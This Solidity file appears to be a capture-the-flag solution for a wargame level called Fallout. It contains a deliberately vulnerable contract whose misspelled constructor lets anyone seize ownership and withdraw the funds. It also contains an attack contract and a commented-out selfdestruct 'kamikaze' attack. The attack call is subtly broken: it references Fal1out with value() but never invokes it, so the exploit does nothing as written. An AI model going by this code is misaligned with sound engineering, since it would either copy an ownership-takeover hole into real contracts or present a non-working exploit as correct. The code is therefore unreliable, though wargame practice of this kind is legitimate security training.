pragma solidity ^0.4.24;

import './Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}


contract FalloutAttack {

    Fallout victim;

    constructor(address _victim) public {
        victim = Fallout(_victim);
    }

    function() external payable { } //if need to receive ether

    //the constructor has a typo.. means it's just a publicly callable function
    //deprecated since solidity 0.4.24
    function attack() external payable returns(bool success) {
        victim.Fal1out.value(msg.value);
    }

    // function getBalance() external returns(uint256 localBalance, uint256 remoteBalance) {
    //     return (address(this).balance, address(victim).balance); //victim should be zero
    // }

}

// contract kamikazeAttack {
//     constructor(address _victim) public payable {
//         selfdestruct(_victim);
//     }
// }
